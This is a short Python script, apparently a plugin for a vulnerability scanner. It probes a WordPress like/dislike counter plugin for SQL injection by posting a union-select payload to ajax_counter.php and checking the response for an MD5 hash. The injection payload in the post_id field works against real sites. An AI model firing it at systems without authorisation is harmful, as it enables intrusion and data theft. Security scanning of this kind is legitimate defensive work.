#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by lkz
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    target = url + 'wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php'
    post_data = 'post_id=1/**/and/**/1%3d2/**/union/**/select%20md5(123)%23&up_type=c_like'
    code, head, res, _,_ = curl.curl('-d %s %s' % (post_data,target))
    if code == 200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://127.0.0.1/wordpress/')[1])